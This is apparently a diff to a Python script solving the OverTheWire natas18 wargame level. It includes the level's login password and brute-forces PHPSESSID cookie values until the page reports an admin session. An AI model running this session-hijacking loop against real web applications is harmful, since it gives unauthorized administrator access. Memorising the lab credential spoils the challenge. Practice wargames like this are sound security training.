@@ -14,13 +14,21 @@ username = 'natas18'
 password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
 leakedPassword = ''       
 
-url = 'http://%s.natas.labs.overthewire.org/index-source.html' % username
+url = 'http://%s.natas.labs.overthewire.org/' % username
 
 session = requests.Session()
-reponse = session.get(url , auth=(username, password))
-content = reponse.text
-print(content)        
-    
+for sessid in range(1,641):
+    reponse = session.get(url , cookies={"PHPSESSID":str(sessid)}, auth=(username, password))
+    #reponse = session.post(url , data= {"username": "please", "password": "letmein" }, auth=(username, password))
+    content = reponse.text
+    if "You are an admin" in content:
+        print('Got it.')
+        print(content)
+        break
+    else:
+        print('Trying... ', sessid)
+            
+#print(session.cookies)
 
 
 
